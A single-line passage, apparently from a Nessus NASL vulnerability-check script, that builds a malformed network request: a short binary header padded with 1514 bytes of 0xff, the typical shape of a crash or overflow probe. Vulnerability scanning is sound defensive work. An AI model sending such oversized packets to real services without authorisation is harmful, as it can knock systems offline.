...
req = raw_string( 0x03, 0x66, 0x14, 0x71, 0x00, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x0a, 0xff, 0xff, 0x02, 0x01, 0x01, 0x10, 0x27, crap( data: raw_string( 0xff ), length: 1514 ) );
